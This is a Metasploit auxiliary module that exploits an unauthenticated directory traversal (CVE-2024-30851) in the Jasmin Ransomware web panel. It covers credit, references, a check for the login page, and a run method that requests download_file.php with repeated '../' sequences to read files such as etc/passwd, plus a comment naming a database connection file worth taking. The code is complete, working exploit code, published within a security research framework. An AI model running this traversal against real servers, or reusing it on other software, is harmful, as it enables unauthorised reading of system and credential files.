##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Jasmin Ransomware Web Server Unauthenticated Directory Traversal',
        'Description' => %q{
          The Jasmin Ransomware web server contains an unauthenticated directory traversal vulnerability
          within the download functionality. As of April 15, 2024 this was still unpatched, so all
          versions are vulnerable. The last patch was in 2021, so it will likely not ever be patched.
        },
        'References' => [
          ['CVE', '2024-30851'],
          ['URL', 'https://github.com/chebuya/CVE-2024-30851-jasmin-ransomware-path-traversal-poc'],
          ['URL', 'https://github.com/codesiddhant/Jasmin-Ransomware']
        ],
        'Author' => [
          'chebuya', # discovery, PoC
          'h00die', # metasploit module
        ],
        'License' => MSF_LICENSE,
        'DisclosureDate' => '2023-04-08',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The relative URI of the Jasmin Ransomware webserver', '/']),
        OptInt.new('DEPTH', [true, 'Depth of directory traversal to root ', 9]),
        OptString.new('FILE', [true, 'File to retrieve', 'etc/passwd'])
        # /var/www/html/database/db_conection.php another good file to pull
      ]
    )
  end

  def check
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path)
    )
    return Exploit::CheckCode::Unknown("#{peer} - Could not connect to web service - no response") if res.nil?
    return Exploit::CheckCode::Safe("#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") unless res.code == 200

    return Exploit::CheckCode::Detected('Jasmin Login page detected') if res.body.include? '<title>Jasmin Dashboard</title>'

    Exploit::CheckCode::Safe("#{peer} - Jasmin login page not found")
  end

  def run
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'download_file.php'),
      'vars_get' => {
        'file' => "#{'../' * datastore['DEPTH']}#{datastore['FILE']}"
      }
    )
    fail_with(Failure::Unknown, 'No response from server') if res.nil?
    fail_with(Failure::NotFound, 'Check FILE or DEPTH, file not found on server') if res.body.empty?
    fail_with(Failure::UnexpectedReply, "Server returned an unexpected HTTP code: #{res.code}") unless res.code == 302

    print_good(res.body)
    # store loot
    path = store_loot(
      'jasmin.webpanel.dir.traversal',
      'text/plain',
      datastore['rhost'],
      res.body,
      File.basename(datastore['FILE'])
    )
    print_good('Saved file to: ' + path)
  end
end
